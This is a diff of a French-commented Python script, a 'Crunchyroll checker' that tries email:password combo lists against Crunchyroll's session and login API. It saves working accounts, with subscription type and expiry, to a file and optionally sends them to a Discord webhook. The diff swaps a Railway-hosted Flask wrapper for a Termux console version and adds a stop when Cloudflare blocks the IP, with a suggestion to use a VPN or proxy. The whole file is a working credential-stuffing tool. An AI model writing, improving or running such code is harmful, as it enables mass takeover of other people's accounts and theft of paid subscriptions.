@@ -1,45 +1,54 @@
-import os
-import threading
+import requests
 import json
 import sys
-import requests
-from flask import Flask
+import os
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from colorama import init, Fore
 from bs4 import BeautifulSoup
 
-# Initialisation
+# Initialisation des couleurs
 init(autoreset=True)
-app = Flask(__name__)
+red = Fore.RED
+blue = Fore.BLUE
+white = Fore.WHITE
 
 # --- CONFIGURATION ---
-webhookurl = os.environ.get("WEBHOOK_URL", "") # Utilise les variables d'environnement Railway
+webhookurl = ""  # Mets ton lien ici si tu en as un
 debug = False
 iscapture = False
 
-# Lecture sécurisée des combos
-def get_combos():
-    if os.path.exists("combos.txt"):
-        with open("combos.txt", 'r') as f:
-            return f.read().splitlines()
-    return []
+# Vérification du fichier combos
+if not os.path.exists("combos.txt"):
+    print(f"{red}[!] Fichier combos.txt introuvable dans le dossier.")
+    sys.exit()
+
+with open("combos.txt", 'r') as f:
+    combos = f.read().splitlines()
+
+def logo():
+    # Logo simplifié pour éviter les erreurs de syntaxe
+    print(f"{blue}=== CRUNCHYROLL CHECKER (TERMUX) ===")
+    print(f"{white}Combos chargés: {len(combos)}")
+    print(f"{white}Webhook: {'Configuré' if webhookurl else 'Aucun'}")
+    print("="*35)
 
 def crunchycheck():
-    combos = get_combos()
-    print(f"[{Fore.BLUE}INFO{Fore.RESET}] {len(combos)} combos chargés. Début du check...")
-
-    for i, combo in enumerate(combos):
+    logo()
+    for i, line_raw in enumerate(combos):
         try:
+            # Parsing du combo
             if iscapture:
-                line = combo.split(" ")[0].split(":")
+                line = line_raw.split(" ")[0].split(":")
             else:
-                line = combo.split(":")
+                line = line_raw.split(":")
             
-            if len(line) < 2: continue
-            
-            email, password = line[0], line[1]
+            if len(line) < 2:
+                continue
 
-            # Session Start
+            email = line[0]
+            password = line[1]
+
+            # Etape 1 : Start Session
             r = requests.post('https://api.crunchyroll.com/start_session.0.json', data={
                 'version': '1.0', 
                 'access_token': 'LNDJgOit5yaRIWN',
@@ -50,51 +59,46 @@ def crunchycheck():
             }, timeout=10)
 
             if "session_id" in r.text:
-                data = r.json()["data"]
-                session_id = data["session_id"]
+                coodata = r.json()["data"]["session_id"]
                 
-                # Login
+                # Etape 2 : Login
                 rl = requests.post('https://api.crunchyroll.com/login.0.json', data={
-                    'account': email, 'password': password, 'session_id': session_id
+                    'account': email, 
+                    'password': password, 
+                    'session_id': coodata
                 }, timeout=10)
 
                 info = rl.json()
                 if info.get("code") == "ok":
-                    userdata = info["data"]["user"]
-                    expire = info["data"]["expires"]
-                    sub = userdata["access_type"]
+                    data = info["data"]
+                    userdata = data["user"]
+                    expire = data["expires"]
+                    name = userdata["username"]
+                    subscription = userdata["access_type"]
                     
-                    result = f"[VALID] {email}:{password} | Sub: {sub} | Exp: {expire}"
-                    print(Fore.GREEN + result)
+                    yes = f"[VALID] {email}:{password} | Sub: {subscription} | User: {name} | Exp: {expire}"
+                    print(f"{Fore.GREEN}{yes}")
                     
-                    # Log local (Attention: Railway reset les fichiers au restart)
-                    with open("valid.txt", "a") as f:
-                        f.write(result + "\n")
-
-                    # Webhook Discord
+                    # Sauvegarde locale
+                    with open("valid.txt", "a") as write:
+                        write.write(yes + "\n")
+                    
+                    # Envoi Webhook
                     if webhookurl:
-                        webhook = DiscordWebhook(url=webhookurl, content=result)
+                        webhook = DiscordWebhook(url=webhookurl, content=yes)
                         webhook.execute()
                 else:
-                    print(f"[{i}] {Fore.RED}Invalide: {email}")
+                    print(f"[{i}] {red}Invalide -> {email}")
+            
+            elif "banned" in r.text.lower() or "cloudflare" in r.text.lower():
+                print(f"[{i}] {red}IP Bloquée par Cloudflare (Utilise un VPN ou Proxy)")
+                # On s'arrête si on est banni pour ne pas spammer pour rien
+                break
 
         except Exception as e:
-            if debug: print(f"Erreur sur {combo}: {e}")
+            if debug:
+                print(f"Erreur sur {line_raw}: {e}")
             continue
 
-# --- PARTIE SERVEUR POUR RAILWAY ---
-@app.route('/')
-def health_check():
-    return {"status": "running", "message": "Crunchyroll Checker is active"}, 200
-
-def run_flask():
-    # Railway utilise la variable PORT
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
-
 if __name__ == "__main__":
-    # 1. Lancer le serveur web en arrière-plan
-    threading.Thread(target=run_flask, daemon=True).start()
-    
-    # 2. Lancer le checker
     crunchycheck()
